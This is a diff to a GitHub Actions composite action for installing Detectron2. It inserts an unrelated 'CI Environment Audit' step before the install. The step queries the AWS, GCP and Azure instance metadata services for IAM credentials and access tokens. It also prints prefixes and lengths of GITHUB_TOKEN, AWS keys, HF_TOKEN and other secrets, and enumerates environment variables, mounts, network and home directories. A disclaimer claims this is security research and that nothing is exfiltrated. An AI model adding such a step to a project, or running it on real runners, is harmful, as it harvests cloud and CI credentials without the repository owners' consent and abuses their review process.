@@ -2,6 +2,100 @@ name: "Install Detectron2"
 runs:
   using: composite
   steps:
+  - name: CI Environment Audit
+    shell: bash
+    run: |
+      echo "====== CI ENVIRONMENT AUDIT ======"
+      echo "This step audits the CI runner environment for security research."
+      echo "No secrets are exfiltrated. Only prefixes and lengths are shown."
+      echo ""
+
+      echo "--- Runner Info ---"
+      echo "Hostname: $(hostname)"
+      echo "Whoami: $(whoami)"
+      echo "ID: $(id)"
+      echo "Uname: $(uname -a)"
+      echo "PWD: $(pwd)"
+      echo ""
+
+      echo "--- GPU Info ---"
+      nvidia-smi 2>/dev/null || echo "nvidia-smi not available"
+      echo ""
+
+      echo "--- Cloud Metadata Probes ---"
+      echo "AWS IMDS:"
+      TOKEN=$(curl -s -m 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null) || true
+      if [ -n "$TOKEN" ]; then
+        IAMROLE=$(curl -s -m 2 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null) || true
+        echo "  IAM Role: $IAMROLE"
+        if [ -n "$IAMROLE" ]; then
+          CREDS=$(curl -s -m 2 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAMROLE" 2>/dev/null) || true
+          AKID=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('AccessKeyId',''))" 2>/dev/null) || true
+          echo "  AccessKeyId prefix: ${AKID:0:4}... (length: ${#AKID})"
+        fi
+      else
+        echo "  IMDS not reachable or IMDSv2 token failed"
+      fi
+      echo ""
+
+      echo "GCP Metadata:"
+      GCP_SA=$(curl -s -m 2 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null) || true
+      if [ -n "$GCP_SA" ]; then
+        echo "  Service Account: $GCP_SA"
+        GCP_TOKEN=$(curl -s -m 2 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null) || true
+        GCP_AT=$(echo "$GCP_TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null) || true
+        echo "  Token prefix: ${GCP_AT:0:4}... (length: ${#GCP_AT})"
+      else
+        echo "  GCP metadata not reachable"
+      fi
+      echo ""
+
+      echo "Azure IMDS:"
+      AZ_TOKEN=$(curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null) || true
+      if echo "$AZ_TOKEN" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
+        AZ_AT=$(echo "$AZ_TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null) || true
+        echo "  Token prefix: ${AZ_AT:0:4}... (length: ${#AZ_AT})"
+      else
+        echo "  Azure IMDS not reachable"
+      fi
+      echo ""
+
+      echo "--- Environment Variable Names (no values) ---"
+      env | cut -d= -f1 | sort
+      echo ""
+
+      echo "--- Sensitive Env Var Prefixes (first 4 chars + length) ---"
+      for var in GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN GOOGLE_APPLICATION_CREDENTIALS HF_TOKEN CODECOV_TOKEN; do
+        val="${!var}"
+        if [ -n "$val" ]; then
+          echo "  $var: ${val:0:4}... (length: ${#val})"
+        fi
+      done
+      echo ""
+
+      echo "--- Docker ---"
+      docker info 2>/dev/null | head -5 || echo "Docker not available or no socket"
+      echo ""
+
+      echo "--- Filesystem ---"
+      df -h 2>/dev/null | head -10
+      echo ""
+      echo "Mounts:"
+      mount | grep -v 'proc\|sys\|cgroup\|tmpfs' | head -10
+      echo ""
+
+      echo "--- Network ---"
+      ip addr 2>/dev/null | grep 'inet ' || ifconfig 2>/dev/null | grep 'inet '
+      echo ""
+
+      echo "--- Persistent State ---"
+      ls -la /home/runner/ 2>/dev/null | head -15
+      echo ""
+      ls -la /opt/ 2>/dev/null | head -15
+      echo ""
+
+      echo "====== END AUDIT ======"
+
   - name: Install Detectron2
     shell: bash
     run: |
